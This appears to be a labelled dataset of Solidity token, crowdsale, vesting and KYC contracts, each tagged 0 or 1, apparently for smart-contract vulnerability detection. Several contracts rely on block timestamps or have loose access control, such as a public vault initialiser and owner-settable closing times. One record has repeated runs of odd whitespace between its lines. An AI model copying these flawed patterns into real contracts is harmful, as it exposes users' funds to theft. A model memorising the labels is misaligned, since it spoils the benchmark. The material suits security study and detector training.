0<CODESPLIT>contract ZeroGravityToken {    using SafeMath for uint256;    string public name;    string public symbol;    uint8 public decimals = 6;      uint256 public totalSupply;    mapping(address => uint256) public balanceOf;    mapping(address => mapping(address => uint256)) public allowance;    mapping(address => mapping(uint => bool)) public usedSigIds;      address public tokenDistributor;      address public rescueAccount;      event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    modifier rescueAccountOnly {require(msg.sender == rescueAccount); _;}    modifier tokenDistributionPeriodOnly {require(tokenDistributor == msg.sender); _;}    enum sigStandard { typed, personal, stringHex }    enum sigDestination { transfer, approve, approveAndCall, transferFrom }    bytes constant public ethSignedMessagePrefix = "\x19Ethereum Signed Message:\n";    bytes32 constant public sigDestinationTransfer = keccak256(        "address Token Contract Address",        "address Sender's Address",        "address Recipient's Address",        "uint256 Amount to Transfer (last six digits are decimals)",        "uint256 Fee in Tokens Paid to Executor (last six digits are decimals)",        "address Account which Receives Fee",        "uint256 Signature Expiration Timestamp (unix timestamp)",        "uint256 Signature ID"    );      bytes32 constant public sigDestinationTransferFrom = keccak256(        "address Token Contract Address",        "address Address Approved for Withdraw",        "address Account to Withdraw From",        "address Withdrawal Recipient Address",        "uint256 Amount to Transfer (last six digits are decimals)",        "uint256 Fee in Tokens Paid to Executor (last six digits are decimals)",        "address Account which Receives Fee",        "uint256 Signature Expiration Timestamp (unix timestamp)",        "uint256 Signature ID"    );      bytes32 constant public sigDestinationApprove = keccak256(        "address Token Contract Address",        "address Withdrawal Approval Address",        "address Withdrawal Recipient Address",        "uint256 Amount to Transfer (last six digits are decimals)",        "uint256 Fee in Tokens Paid to Executor (last six digits are decimals)",        "address Account which Receives Fee",        "uint256 Signature Expiration Timestamp (unix timestamp)",        "uint256 Signature ID"    );      bytes32 constant public sigDestinationApproveAndCall = keccak256(        "address Token Contract Address",        "address Withdrawal Approval Address",        "address Withdrawal Recipient Address",        "uint256 Amount to Transfer (last six digits are decimals)",        "bytes Data to Transfer",        "uint256 Fee in Tokens Paid to Executor (last six digits are decimals)",        "address Account which Receives Fee",        "uint256 Signature Expiration Timestamp (unix timestamp)",        "uint256 Signature ID"    );           constructor (string tokenName, string tokenSymbol) public {        name = tokenName;        symbol = tokenSymbol;        rescueAccount = tokenDistributor = msg.sender;    } 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		         function internalTransfer (address from, address to, uint value) internal {        require(to != 0x0);          balanceOf[from] = balanceOf[from].sub(value);        balanceOf[to] = balanceOf[to].add(value);        emit Transfer(from, to, value);    }         function internalDoubleTransfer (address from, address to1, uint value1, address to2, uint value2) internal {        require(to1 != 0x0 && to2 != 0x0);          balanceOf[from] = balanceOf[from].sub(value1.add(value2));        balanceOf[to1] = balanceOf[to1].add(value1);        emit Transfer(from, to1, value1);        if (value2 > 0) {            balanceOf[to2] = balanceOf[to2].add(value2);            emit Transfer(from, to2, value2);        }    }         function requireSignature (        bytes32 data,        address signer,        uint256 deadline,        uint256 sigId,        bytes sig,        sigStandard sigStd,        sigDestination sigDest    ) internal {        bytes32 r;        bytes32 s;        uint8 v;        assembly {              r := mload(add(sig, 32))            s := mload(add(sig, 64)) 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		            v := byte(0, mload(add(sig, 96)))        }        if (v < 27)            v += 27;        require(block.timestamp <= deadline && !usedSigIds[signer][sigId]);          if (sigStd == sigStandard.typed) {              require(                signer == ecrecover(                    keccak256(                        sigDest == sigDestination.transfer                            ? sigDestinationTransfer                            : sigDest == sigDestination.approve                                ? sigDestinationApprove                                : sigDest == sigDestination.approveAndCall                                    ? sigDestinationApproveAndCall                                    : sigDestinationTransferFrom,                        data                    ),                    v, r, s                )            );        } else if (sigStd == sigStandard.personal) {              require(                signer == ecrecover(keccak256(ethSignedMessagePrefix, "32", data), v, r, s)                  ||                signer == ecrecover(keccak256(ethSignedMessagePrefix, "\x20", data), v, r, s)              );        } else {              require(                signer == ecrecover(keccak256(ethSignedMessagePrefix, "64", hexToString(data)), v, r, s)                  ||                signer == ecrecover(keccak256(ethSignedMessagePrefix, "\x40", hexToString(data)), v, r, s)              );        }        usedSigIds[signer][sigId] = true;    }         function hexToString (bytes32 sig) internal pure returns (bytes) {        bytes memory str = new bytes(64);        for (uint8 i = 0; i < 32; ++i) {            str[2 * i] = byte((uint8(sig[i]) / 16 < 10 ? 48 : 87) + uint8(sig[i]) / 16);            str[2 * i + 1] = byte((uint8(sig[i]) % 16 < 10 ? 48 : 87) + (uint8(sig[i]) % 16));        }        return str;    }         function transfer (address to, uint256 value) public returns (bool) {        internalTransfer(msg.sender, to, value);        return true;    }         function transferViaSignature ( 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		        address     from,        address     to,        uint256     value,        uint256     fee,        address     feeRecipient,        uint256     deadline,        uint256     sigId,        bytes       sig,        sigStandard sigStd    ) external returns (bool) {        requireSignature(            keccak256(address(this), from, to, value, fee, feeRecipient, deadline, sigId),            from, deadline, sigId, sig, sigStd, sigDestination.transfer        );        internalDoubleTransfer(from, to, value, feeRecipient, fee);        return true;    }         function approve (address spender, uint256 value) public returns (bool) {        allowance[msg.sender][spender] = value;        emit Approval(msg.sender, spender, value);        return true;    }         function approveViaSignature (        address     from,        address     spender,        uint256     value,        uint256     fee,        address     feeRecipient,        uint256     deadline,        uint256     sigId,        bytes       sig,        sigStandard sigStd    ) external returns (bool) {        requireSignature(            keccak256(address(this), from, spender, value, fee, feeRecipient, deadline, sigId),            from, deadline, sigId, sig, sigStd, sigDestination.approve        );        allowance[from][spender] = value;        emit Approval(from, spender, value);        internalTransfer(from, feeRecipient, fee);        return true;    }         function transferFrom (address from, address to, uint256 value) public returns (bool) {        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);        internalTransfer(from, to, value);        return true;    }         function transferFromViaSignature (        address     signer,        address     from,        address     to,        uint256     value,        uint256     fee,        address     feeRecipient,        uint256     deadline,        uint256     sigId,        bytes       sig,        sigStandard sigStd    ) external returns (bool) { 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		        requireSignature(            keccak256(address(this), from, to, value, fee, feeRecipient, deadline, sigId),            signer, deadline, sigId, sig, sigStd, sigDestination.transferFrom        );        allowance[from][signer] = allowance[from][signer].sub(value);        internalDoubleTransfer(from, to, value.sub(fee), feeRecipient, fee);        return true;    }         function approveAndCall (address spender, uint256 value, bytes extraData) public returns (bool) {        approve(spender, value);        tokenRecipient(spender).receiveApproval(msg.sender, value, this, extraData);        return true;    }         function approveAndCallViaSignature (        address     from,        address     spender,        uint256     value,        bytes       extraData,        uint256     fee,        address     feeRecipient,        uint256     deadline,        uint256     sigId,        bytes       sig,        sigStandard sigStd    ) external returns (bool) {        requireSignature(            keccak256(address(this), from, spender, value, extraData, fee, feeRecipient, deadline, sigId),            from, deadline, sigId, sig, sigStd, sigDestination.approveAndCall        );        allowance[from][spender] = value;        emit Approval(from, spender, value);        tokenRecipient(spender).receiveApproval(from, value, this, extraData);        internalTransfer(from, feeRecipient, fee);        return true;    } 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		         function multiMint (address[] recipients, uint256[] amounts) external tokenDistributionPeriodOnly {                require(recipients.length == amounts.length);        uint total = 0;        for (uint i = 0; i < recipients.length; ++i) {            balanceOf[recipients[i]] = balanceOf[recipients[i]].add(amounts[i]);            total = total.add(amounts[i]);            emit Transfer(0x0, recipients[i], amounts[i]);        }        totalSupply = totalSupply.add(total);            } 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		         function lastMint () external tokenDistributionPeriodOnly {        require(totalSupply > 0);        uint256 remaining = totalSupply.mul(40).div(60);                   uint256 fractionalPart = remaining.add(totalSupply) % (uint256(10) ** decimals);        remaining = remaining.sub(fractionalPart);          balanceOf[tokenDistributor] = balanceOf[tokenDistributor].add(remaining);        emit Transfer(0x0, tokenDistributor, remaining);        totalSupply = totalSupply.add(remaining);        tokenDistributor = 0x0;      }         function rescueLostTokens (ERC20CompatibleToken tokenContract, uint256 value) external rescueAccountOnly {        tokenContract.transfer(rescueAccount, value);    }      		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		    function changeRescueAccount (address newRescueAccount) external rescueAccountOnly {        rescueAccount = newRescueAccount;    } 		   	  				  	  	      		 			  		 	  	 		 	 		 		 	  	 			 	   		    	  	 			  			 	   		 	 		}
1<CODESPLIT>contract BitSongCrowdsale is Ownable{  using SafeMath for uint256;  using SafeERC20 for ERC20;  ERC20 public token;  address public wallet;  uint256 public rate;  uint256 public weiRaised;  address public kycAdmin;  uint256 public hardCap;  uint256 public tokensAllocated;  uint256 public openingTime;  uint256 public closingTime;  uint256 public duration;  mapping(address => bool) public approvals;  mapping(address => uint256) public balances;  event TokenPurchase(address indexed purchaser, uint256 value, uint256 amount);  event KycApproved(address indexed beneficiary, address indexed admin, bool status);  event KycRefused(address indexed beneficiary, address indexed admin, bool status);  modifier onlyKycAdmin() { require(msg.sender == kycAdmin); _; }  modifier onlyWhileOpen { require(block.timestamp >= openingTime && block.timestamp <= closingTime); _; }  constructor(uint256 _rate, address _wallet, uint256 _duration, uint256 _hardCap, ERC20 _tokenAddress) public {    require(_rate > 0);    require(_wallet != address(0));    require(_tokenAddress != address(0));    rate = _rate;    wallet = _wallet;    token = _tokenAddress;    hardCap = _hardCap * 10**18;    duration = _duration * 1 days;  }  function () external payable {    buyTokens();  }  function buyTokens() public onlyWhileOpen() payable {    require(msg.value > 0);    require(approvals[msg.sender] == true);    uint256 weiAmount = msg.value;    uint256 tokenAmount = weiAmount.mul(rate);    tokensAllocated = tokensAllocated.add(tokenAmount);    assert(tokensAllocated <= hardCap);    weiRaised = weiRaised.add(weiAmount);    balances[msg.sender] = balances[msg.sender].add(tokenAmount);    emit TokenPurchase(msg.sender, weiAmount, tokenAmount);    wallet.transfer(msg.value);  }  function withdrawTokens() external {    require(hasClosed());    uint256 amount = balances[msg.sender];    require(amount > 0);    balances[msg.sender] = 0;    token.safeTransferFrom(wallet, msg.sender, amount);  }  function withdrawTokensFor(address _beneficiary) external {    require(hasClosed());    uint256 amount = balances[_beneficiary];    require(amount > 0);    balances[_beneficiary] = 0;    token.safeTransferFrom(wallet, _beneficiary, amount);  }  function hasClosed() public view returns (bool) {    return block.timestamp > closingTime;  }  function approveAddress(address _beneficiary) external onlyKycAdmin() {    approvals[_beneficiary] = true;    emit KycApproved(_beneficiary, kycAdmin, true);  }  function refuseAddress(address _beneficiary) external onlyKycAdmin() {    approvals[_beneficiary] = false;    emit KycRefused(_beneficiary, kycAdmin, false);  }  function rewardManual(address _beneficiary, uint256 _amount) external onlyOwner() {    require(_amount > 0);    require(_beneficiary != address(0));    tokensAllocated = tokensAllocated.add(_amount);    assert(tokensAllocated <= hardCap);    balances[_beneficiary] = balances[_beneficiary].add(_amount);  }  function transfer(address _beneficiary, uint256 _amount) external onlyOwner() {    require(_amount > 0);    require(_beneficiary != address(0));    token.safeTransfer(_beneficiary, _amount);  }  function setKycAdmin(address _newAdmin) external onlyOwner() {    kycAdmin = _newAdmin;  }  function startDistribution() external onlyOwner() {    require(openingTime == 0);    openingTime = block.timestamp;    closingTime = openingTime.add(duration);  }  function setRate(uint256 _newRate) external onlyOwner() {    rate = _newRate;  }  function setClosingTime(uint256 _newTime) external onlyOwner() {    closingTime = _newTime;  }}
0<CODESPLIT>contract CanReclaimToken is Ownable {  using SafeERC20 for ERC20Basic;     function reclaimToken(ERC20Basic token) external onlyOwner {    uint256 balance = token.balanceOf(this);    token.safeTransfer(owner, balance);  }}  pragma solidity ^0.4.24;
0<CODESPLIT>contract GotToken is CanReclaimToken, MintableToken, PausableToken, BurnableToken {    string public constant name = "GOToken";    string public constant symbol = "GOT";    uint8 public constant decimals = 18;         constructor() public {                 paused = true;    }}  pragma solidity ^0.4.24;
0<CODESPLIT>contract PGOMonthlyInternalVault {    using SafeMath for uint256;    using SafeERC20 for GotToken;    struct Investment {        address beneficiary;        uint256 totalBalance;        uint256 released;    }         uint256 public constant VESTING_DIV_RATE = 21;                       uint256 public constant VESTING_INTERVAL = 30 days;                  uint256 public constant VESTING_CLIFF = 90 days;                     uint256 public constant VESTING_DURATION = 720 days;                 GotToken public token;    uint256 public start;    uint256 public end;    uint256 public cliff;                   mapping(address => Investment) public investments;         function init(address[] beneficiaries, uint256[] balances, uint256 startTime, address _token) public {                 require(token == address(0));        require(beneficiaries.length == balances.length);        start = startTime;        cliff = start.add(VESTING_CLIFF);        end = start.add(VESTING_DURATION);        token = GotToken(_token);        for (uint256 i = 0; i < beneficiaries.length; i = i.add(1)) {            investments[beneficiaries[i]] = Investment(beneficiaries[i], balances[i], 0);        }    }         function release(address beneficiary) public {        uint256 unreleased = releasableAmount(beneficiary);        require(unreleased > 0);        investments[beneficiary].released = investments[beneficiary].released.add(unreleased);        token.safeTransfer(beneficiary, unreleased);    }         function release() public {        release(msg.sender);    }         function getInvestment(address beneficiary) public view returns(address, uint256, uint256) {        return (            investments[beneficiary].beneficiary,            investments[beneficiary].totalBalance,            investments[beneficiary].released        );    }         function releasableAmount(address beneficiary) public view returns (uint256) {        return vestedAmount(beneficiary).sub(investments[beneficiary].released);    }         function vestedAmount(address beneficiary) public view returns (uint256) {        uint256 vested = 0;        if (block.timestamp >= cliff && block.timestamp < end) {                         uint256 totalBalance = investments[beneficiary].totalBalance;            uint256 monthlyBalance = totalBalance.div(VESTING_DIV_RATE);            uint256 time = block.timestamp.sub(cliff);            uint256 elapsedOffsets = time.div(VESTING_INTERVAL);            uint256 vestedToSum = elapsedOffsets.mul(monthlyBalance);            vested = vested.add(vestedToSum);        }        if (block.timestamp >= end) {                         vested = investments[beneficiary].totalBalance;        }        return vested;    }}
1<CODESPLIT>contract PGOMonthlyPresaleVault is PGOMonthlyInternalVault {         function vestedAmount(address beneficiary) public view returns (uint256) {        uint256 vested = 0;        if (block.timestamp >= start) {                         vested = investments[beneficiary].totalBalance.div(3);        }        if (block.timestamp >= cliff && block.timestamp < end) {                         uint256 unlockedStartBalance = investments[beneficiary].totalBalance.div(3);            uint256 totalBalance = investments[beneficiary].totalBalance;            uint256 lockedBalance = totalBalance.sub(unlockedStartBalance);            uint256 monthlyBalance = lockedBalance.div(VESTING_DIV_RATE);            uint256 daysToSkip = 90 days;            uint256 time = block.timestamp.sub(start).sub(daysToSkip);            uint256 elapsedOffsets = time.div(VESTING_INTERVAL);            vested = vested.add(elapsedOffsets.mul(monthlyBalance));        }        if (block.timestamp >= end) {                         vested = investments[beneficiary].totalBalance;        }        return vested;    }}
0<CODESPLIT>contract KYCBase {    using SafeMath for uint256;    mapping (address => bool) public isKycSigner;    mapping (uint64 => uint256) public alreadyPayed;    event KycVerified(address indexed signer, address buyerAddress, uint64 buyerId, uint maxAmount);    constructor(address[] kycSigners) internal {        for (uint i = 0; i < kycSigners.length; i++) {            isKycSigner[kycSigners[i]] = true;        }    }         function releaseTokensTo(address buyer) internal returns(bool);         function senderAllowedFor(address buyer)    internal view returns(bool)    {        return buyer == msg.sender;    }    function buyTokensFor(address buyerAddress, uint64 buyerId, uint maxAmount, uint8 v, bytes32 r, bytes32 s)    public payable returns (bool)    {        require(senderAllowedFor(buyerAddress));        return buyImplementation(buyerAddress, buyerId, maxAmount, v, r, s);    }    function buyTokens(uint64 buyerId, uint maxAmount, uint8 v, bytes32 r, bytes32 s)    public payable returns (bool)    {        return buyImplementation(msg.sender, buyerId, maxAmount, v, r, s);    }    function buyImplementation(address buyerAddress, uint64 buyerId, uint maxAmount, uint8 v, bytes32 r, bytes32 s)    private returns (bool)    {                 bytes32 hash = sha256(abi.encodePacked("Eidoo icoengine authorization", this, buyerAddress, buyerId, maxAmount));        address signer = ecrecover(hash, v, r, s);        if (!isKycSigner[signer]) {            revert();        } else {            uint256 totalPayed = alreadyPayed[buyerId].add(msg.value);            require(totalPayed <= maxAmount);            alreadyPayed[buyerId] = totalPayed;            emit KycVerified(signer, buyerAddress, buyerId, maxAmount);            return releaseTokensTo(buyerAddress);        }    }         function () public {        revert();    }} pragma solidity ^0.4.24;
0<CODESPLIT>contract ICOEngineInterface {         function started() public view returns(bool);         function ended() public view returns(bool);         function startTime() public view returns(uint);         function endTime() public view returns(uint);                                       function totalTokens() public view returns(uint);              function remainingTokens() public view returns(uint);         function price() public view returns(uint);} pragma solidity ^0.4.23; 
1<CODESPLIT>contract PGOVault {    using SafeMath for uint256;    using SafeERC20 for GotToken;    uint256[4] public vesting_offsets = [        360 days,        540 days,        720 days,        900 days    ];    uint256[4] public vesting_amounts = [        0.875e7 * 1e18,        0.875e7 * 1e18,        0.875e7 * 1e18,        0.875e7 * 1e18    ];    address public pgoWallet;    GotToken public token;    uint256 public start;    uint256 public released;    uint256 public vestingOffsetsLength = vesting_offsets.length;         constructor(        address _pgoWallet,        address _token,        uint256 _start    )        public    {        pgoWallet = _pgoWallet;        token = GotToken(_token);        start = _start;    }         function release() public {        uint256 unreleased = releasableAmount();        require(unreleased > 0);        released = released.add(unreleased);        token.safeTransfer(pgoWallet, unreleased);    }         function releasableAmount() public view returns (uint256) {        return vestedAmount().sub(released);    }         function vestedAmount() public view returns (uint256) {        uint256 vested = 0;        for (uint256 i = 0; i < vestingOffsetsLength; i = i.add(1)) {            if (block.timestamp > start.add(vesting_offsets[i])) {                vested = vested.add(vesting_amounts[i]);            }        }        return vested;    }             function unreleasedAmount() public view returns (uint256) {        uint256 unreleased = 0;        for (uint256 i = 0; i < vestingOffsetsLength; i = i.add(1)) {            unreleased = unreleased.add(vesting_amounts[i]);        }        return unreleased.sub(released);    }}  pragma solidity ^0.4.24;
1<CODESPLIT>contract GotCrowdSale is Pausable, CanReclaimToken, ICOEngineInterface, KYCBase {         uint256 public constant START_TIME = 1529416800;         uint256 public constant END_TIME = 1530655140;                                      uint256 public constant TOKEN_PER_ETHER = 740;                                      uint256 public constant MONTHLY_INTERNAL_VAULT_CAP = 2.85e7 * 1e18;         uint256 public constant PGO_UNLOCKED_LIQUIDITY_CAP = 1.5e7 * 1e18;         uint256 public constant PGO_INTERNAL_RESERVE_CAP = 3.5e7 * 1e18;         uint256 public constant RESERVED_PRESALE_CAP = 1.5754888e7 * 1e18;                        uint256 public constant RESERVATION_CAP = 0.4297111e7 * 1e18;         uint256 public constant TOTAL_ICO_CAP = 0.5745112e7 * 1e18;    uint256 public start;                                                  uint256 public end;                                                    uint256 public cap;                                                    uint256 public tokenPerEth;    uint256 public availableTokens;                                        address[] public kycSigners;                                           bool public capReached;    uint256 public weiRaised;    uint256 public tokensSold;              PGOMonthlyInternalVault public pgoMonthlyInternalVault;         PGOMonthlyPresaleVault public pgoMonthlyPresaleVault;         PGOVault public pgoVault;         address public pgoInternalReserveWallet;         address public pgoUnlockedLiquidityWallet;         address public wallet;    GotToken public token;         bool public didOwnerEndCrowdsale;         constructor(        address _token,        address _wallet,        address _pgoInternalReserveWallet,        address _pgoUnlockedLiquidityWallet,        address _pgoMonthlyInternalVault,        address _pgoMonthlyPresaleVault,        address[] _kycSigners    )        public        KYCBase(_kycSigners)    {        require(END_TIME >= START_TIME);        require(TOTAL_ICO_CAP > 0);        start = START_TIME;        end = END_TIME;        cap = TOTAL_ICO_CAP;        wallet = _wallet;        tokenPerEth = TOKEN_PER_ETHER;         availableTokens = TOTAL_ICO_CAP;        kycSigners = _kycSigners;        token = GotToken(_token);        pgoMonthlyInternalVault = PGOMonthlyInternalVault(_pgoMonthlyInternalVault);        pgoMonthlyPresaleVault = PGOMonthlyPresaleVault(_pgoMonthlyPresaleVault);        pgoInternalReserveWallet = _pgoInternalReserveWallet;        pgoUnlockedLiquidityWallet = _pgoUnlockedLiquidityWallet;        wallet = _wallet;                 pgoVault = new PGOVault(pgoInternalReserveWallet, address(token), END_TIME);    }         function mintPreAllocatedTokens() public onlyOwner {        mintTokens(pgoUnlockedLiquidityWallet, PGO_UNLOCKED_LIQUIDITY_CAP);        mintTokens(address(pgoVault), PGO_INTERNAL_RESERVE_CAP);    }         function initPGOMonthlyInternalVault(address[] beneficiaries, uint256[] balances)        public        onlyOwner        equalLength(beneficiaries, balances)    {        uint256 totalInternalBalance = 0;        uint256 balancesLength = balances.length;        for (uint256 i = 0; i < balancesLength; i++) {            totalInternalBalance = totalInternalBalance.add(balances[i]);        }                 require(totalInternalBalance == MONTHLY_INTERNAL_VAULT_CAP);        pgoMonthlyInternalVault.init(beneficiaries, balances, END_TIME, token);        mintTokens(address(pgoMonthlyInternalVault), MONTHLY_INTERNAL_VAULT_CAP);    }         function initPGOMonthlyPresaleVault(address[] beneficiaries, uint256[] balances)        public        onlyOwner        equalLength(beneficiaries, balances)    {        uint256 totalPresaleBalance = 0;        uint256 balancesLength = balances.length;        for (uint256 i = 0; i < balancesLength; i++) {            totalPresaleBalance = totalPresaleBalance.add(balances[i]);        }                 require(totalPresaleBalance == RESERVED_PRESALE_CAP);        pgoMonthlyPresaleVault.init(beneficiaries, balances, END_TIME, token);        mintTokens(address(pgoMonthlyPresaleVault), totalPresaleBalance);    }         function mintReservation(address[] beneficiaries, uint256[] balances)        public        onlyOwner        equalLength(beneficiaries, balances)    {                 uint256 totalReservationBalance = 0;        uint256 balancesLength = balances.length;        for (uint256 i = 0; i < balancesLength; i++) {            totalReservationBalance = totalReservationBalance.add(balances[i]);            uint256 amount = balances[i];                         tokensSold = tokensSold.add(amount);                         availableTokens = availableTokens.sub(amount);            mintTokens(beneficiaries[i], amount);        }        require(totalReservationBalance <= RESERVATION_CAP);    }         function closeCrowdsale() public onlyOwner {        require(block.timestamp >= START_TIME && block.timestamp < END_TIME);        didOwnerEndCrowdsale = true;    }         function finalise() public onlyOwner {        require(didOwnerEndCrowdsale || block.timestamp > end || capReached);        token.finishMinting();        token.unpause();                                            token.transferOwnership(owner);    }         function price() public view returns (uint256 _price) {        return tokenPerEth;    }         function started() public view returns(bool) {        if (block.timestamp >= start) {            return true;        } else {            return false;        }    }         function ended() public view returns(bool) {        if (block.timestamp >= end) {            return true;        } else {            return false;        }    }         function startTime() public view returns(uint) {        return start;    }         function endTime() public view returns(uint) {        return end;    }         function totalTokens() public view returns(uint) {        return cap;    }         function remainingTokens() public view returns(uint) {        return availableTokens;    }         function senderAllowedFor(address buyer) internal view returns(bool) {        require(buyer != address(0));        return true;    }         function releaseTokensTo(address buyer) internal returns(bool) {        require(validPurchase());        uint256 overflowTokens;        uint256 refundWeiAmount;        uint256 weiAmount = msg.value;        uint256 tokenAmount = weiAmount.mul(price());        if (tokenAmount >= availableTokens) {            capReached = true;            overflowTokens = tokenAmount.sub(availableTokens);            tokenAmount = tokenAmount.sub(overflowTokens);            refundWeiAmount = overflowTokens.div(price());            weiAmount = weiAmount.sub(refundWeiAmount);            buyer.transfer(refundWeiAmount);        }        weiRaised = weiRaised.add(weiAmount);        tokensSold = tokensSold.add(tokenAmount);        availableTokens = availableTokens.sub(tokenAmount);        mintTokens(buyer, tokenAmount);        forwardFunds(weiAmount);        return true;    }         function forwardFunds(uint256 _weiAmount) internal {        wallet.transfer(_weiAmount);    }         function validPurchase() internal view returns (bool) {        require(!paused && !capReached);        require(block.timestamp >= start && block.timestamp <= end);        return true;    }         function mintTokens(address to, uint256 amount) private {        token.mint(to, amount);    }    modifier equalLength(address[] beneficiaries, uint256[] balances) {        require(beneficiaries.length == balances.length);        _;    }}
0<CODESPLIT>contract NokuPricingPlan {         function payFee(bytes32 serviceName, uint256 multiplier, address client) public returns(bool paid);         function usageFee(bytes32 serviceName, uint256 multiplier) public view returns(uint fee);}  
0<CODESPLIT>contract BurnableERC20 is ERC20 {    function burn(uint256 amount) public returns (bool burned);} 
0<CODESPLIT>contract NokuTokenBurner is Pausable {    using SafeMath for uint256;    event LogNokuTokenBurnerCreated(address indexed caller, address indexed wallet);    event LogBurningPercentageChanged(address indexed caller, uint256 indexed burningPercentage);         address public wallet;         uint256 public burningPercentage;         uint256 public burnedTokens;         uint256 public transferredTokens;         constructor(address _wallet) public {        require(_wallet != address(0), "_wallet is zero");                wallet = _wallet;        burningPercentage = 100;        emit LogNokuTokenBurnerCreated(msg.sender, _wallet);    }         function setBurningPercentage(uint256 _burningPercentage) public onlyOwner {        require(0 <= _burningPercentage && _burningPercentage <= 100, "_burningPercentage not in [0, 100]");        require(_burningPercentage != burningPercentage, "_burningPercentage equal to current one");                burningPercentage = _burningPercentage;        emit LogBurningPercentageChanged(msg.sender, _burningPercentage);    }         function tokenReceived(address _token, uint256 _amount) public whenNotPaused {        require(_token != address(0), "_token is zero");        require(_amount > 0, "_amount is zero");        uint256 amountToBurn = _amount.mul(burningPercentage).div(100);        if (amountToBurn > 0) {            assert(BurnableERC20(_token).burn(amountToBurn));                        burnedTokens = burnedTokens.add(amountToBurn);        }        uint256 amountToTransfer = _amount.sub(amountToBurn);        if (amountToTransfer > 0) {            assert(BurnableERC20(_token).transfer(wallet, amountToTransfer));            transferredTokens = transferredTokens.add(amountToTransfer);        }    }}  
0<CODESPLIT>contract KcashVesting is Ownable {  using SafeMath for uint256;  address public teamWallet;  address public earlyWallet;  address public institutionWallet;    uint256 public teamTimeLock = 1000 days;  uint256 public earlyTimeLock = 5 * 30 days;  uint256 public institutionTimeLock = 50 * 30 days;       uint256 public teamAllocation = 15 * (10 ** 7) * (10 ** 18);  uint256 public earlyAllocation = 5 * (10 ** 7) * (10 ** 18);  uint256 public institutionAllocation = 15 * (10 ** 7) * (10 ** 18);    uint256 public totalAllocation = 35 * (10 ** 7) * (10 ** 18);    uint256 public teamStageSetting = 34;  uint256 public earlyStageSetting = 5;  uint256 public institutionStageSetting = 50;  ERC20Basic public token;     uint256 public start;     uint256 public lockStartTime;         mapping(address => uint256) public allocations;        mapping(address => uint256) public stageSettings;        mapping(address => uint256) public timeLockDurations;         mapping(address => uint256) public releasedAmounts;        modifier onlyReserveWallets {        require(allocations[msg.sender] > 0);        _;    }    function KcashVesting(ERC20Basic _token,                          address _teamWallet,                          address _earlyWallet,                          address _institutionWallet,                          uint256 _start,                          uint256 _lockTime)public{        require(_start > 0);        require(_lockTime > 0);        require(_start.add(_lockTime) > 0);        require(_teamWallet != address(0));        require(_earlyWallet != address(0));        require(_institutionWallet != address(0));                token = _token;        teamWallet = _teamWallet;        earlyWallet = _earlyWallet;        institutionWallet = _institutionWallet;        start = _start;        lockStartTime = start.add(_lockTime);    }        function allocateToken() onlyOwner public{        require(block.timestamp > lockStartTime);                 require(allocations[teamWallet] == 0);        require(token.balanceOf(address(this)) >= totalAllocation);                allocations[teamWallet] = teamAllocation;        allocations[earlyWallet] = earlyAllocation;        allocations[institutionWallet] = institutionAllocation;                stageSettings[teamWallet] = teamStageSetting;        stageSettings[earlyWallet] = earlyStageSetting;        stageSettings[institutionWallet] = institutionStageSetting;                timeLockDurations[teamWallet] = teamTimeLock;        timeLockDurations[earlyWallet] = earlyTimeLock;        timeLockDurations[institutionWallet] = institutionTimeLock;    }    function releaseToken() onlyReserveWallets public{        uint256 totalUnlocked = unlockAmount();        require(totalUnlocked <= allocations[msg.sender]);        require(releasedAmounts[msg.sender] < totalUnlocked);        uint256 payment = totalUnlocked.sub(releasedAmounts[msg.sender]);                releasedAmounts[msg.sender] = totalUnlocked;        require(token.transfer(msg.sender, payment));    }    function unlockAmount() public view onlyReserveWallets returns(uint256){        uint256 stage = vestStage();        uint256 totalUnlocked = stage.mul(allocations[msg.sender]).div(stageSettings[msg.sender]);        return totalUnlocked;    }        function vestStage() public view onlyReserveWallets returns(uint256){        uint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);        uint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);                if(stage > stageSettings[msg.sender]){            stage = stageSettings[msg.sender];        }        return stage;    }}
0<CODESPLIT>contract Certifiable is Ownable {    Certifier public certifier;    event CertifierChanged(address indexed newCertifier);    constructor(address _certifier) public {        certifier = Certifier(_certifier);    }    function updateCertifier(address _address) public onlyOwner returns (bool success) {        require(_address != address(0));        emit CertifierChanged(_address);        certifier = Certifier(_address);        return true;    }}
0<CODESPLIT>contract KYCToken is Certifiable {    mapping(address => bool) public kycPending;    mapping(address => bool) public managers;    event ManagerAdded(address indexed newManager);    event ManagerRemoved(address indexed removedManager);    modifier onlyManager() {        require(managers[msg.sender] == true);        _;    }    modifier isKnownCustomer(address _address) {        require(!kycPending[_address] || certifier.certified(_address));        if (kycPending[_address]) {            kycPending[_address] = false;        }        _;    }    constructor(address _certifier) public Certifiable(_certifier)    {    }    function addManager(address _address) external onlyOwner {        managers[_address] = true;        emit ManagerAdded(_address);    }    function removeManager(address _address) external onlyOwner {        managers[_address] = false;        emit ManagerRemoved(_address);    }}
0<CODESPLIT>contract Certifier {    event Confirmed(address indexed who);    event Revoked(address indexed who);    function certified(address) public constant returns (bool);    function get(address, string) public constant returns (bytes32);    function getAddress(address, string) public constant returns (address);    function getUint(address, string) public constant returns (uint);}
